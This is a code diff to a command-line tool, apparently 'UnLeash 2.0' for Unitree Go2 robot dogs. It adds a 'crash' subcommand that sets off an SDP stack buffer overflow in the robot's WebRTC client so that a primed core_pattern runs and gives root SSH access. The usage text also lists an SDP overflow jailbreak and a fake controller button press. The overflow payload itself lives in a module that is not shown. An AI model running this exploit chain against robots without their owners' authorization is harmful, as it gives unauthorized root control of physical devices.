@@ -30,6 +30,7 @@ Subcommands:
   unleash enroll <robot-ip> [options]   Guided enrollment (the happy path)
   unleash serve [--port 8080]           Launch broker + API + dashboard
   unleash fetch-key --email <email>     Retrieve per-device AES key from cloud
+  unleash crash [--robot-ip IP]         Crash WebRTC client via SDP overflow
   unleash probe [--robot-ip IP]         Diagnostic DDS dump
   unleash trigger [--hotkey L1+Y]       Send a fake controller button press
   unleash sdp-jailbreak <mode>          SDP overflow jailbreak (benchtop only)
@@ -56,6 +57,9 @@ def main():
         return
     if sub == "fetch-key":
         _main_fetch_key()
+        return
+    if sub == "crash":
+        _main_crash()
         return
     if sub == "probe":
         _main_probe()
@@ -169,6 +173,60 @@ def _main_fetch_key():
                         help="Device family (default: Go2)")
     args = parser.parse_args(sys.argv[2:])
     _run_fetch_key(args)
+
+
+def _main_crash():
+    parser = argparse.ArgumentParser(
+        prog="unleash crash",
+        description="Crash the Go2 WebRTC client (unitreeWebRTCClientMaster) "
+                    "via SDP stack buffer overflow. Used after the USB MSC "
+                    "dongle has primed core_pattern.",
+    )
+    parser.add_argument("--robot-ip", default="192.168.123.162",
+                        help="Robot IP address (default: 192.168.123.162)")
+    parser.add_argument("--port", type=int, default=9991,
+                        help="Signaling port (default: 9991)")
+    parser.add_argument("--aes-key",
+                        help="Per-device AES-128 key (32 hex chars)")
+    parser.add_argument("--debug", action="store_true",
+                        help="Enable debug logging")
+    args = parser.parse_args(sys.argv[2:])
+
+    if args.debug:
+        logging.basicConfig(level=logging.DEBUG, format="  %(name)s: %(message)s")
+
+    from .core.crash import crash_webrtc
+
+    print()
+    print("  UnLeash 2.0 — WebRTC crash trigger")
+    print(f"  Target: {args.robot_ip}:{args.port}")
+    print()
+
+    try:
+        success = crash_webrtc(
+            robot_ip=args.robot_ip,
+            port=args.port,
+            aes_key=args.aes_key,
+        )
+    except ConnectionError as e:
+        print(f"  Error: {e}")
+        sys.exit(1)
+    except Exception as e:
+        print(f"  Failed: {e}")
+        if args.debug:
+            import traceback
+            traceback.print_exc()
+        sys.exit(1)
+
+    if success:
+        print()
+        print("  WebRTC client crashed — core_pattern should fire.")
+        print("  Check: ssh root@{} (if go2_led.sh sets up SSH)".format(
+            args.robot_ip))
+    else:
+        print()
+        print("  Crash may not have triggered. Try again or check the robot.")
+        sys.exit(1)
 
 
 _JAILBREAK_MODES = [
